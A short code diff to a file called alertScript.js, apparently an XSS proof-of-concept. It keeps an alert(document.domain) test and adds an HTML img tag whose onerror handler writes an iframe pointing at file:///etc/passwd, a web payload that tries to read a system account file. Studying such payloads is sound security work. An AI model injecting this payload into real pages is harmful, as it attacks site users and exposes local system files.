@@ -1,7 +1,4 @@
 // File: alertScript.js
 
 alert(document.domain);
-
-alert(window.location);
-// File: script.js
-
+<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
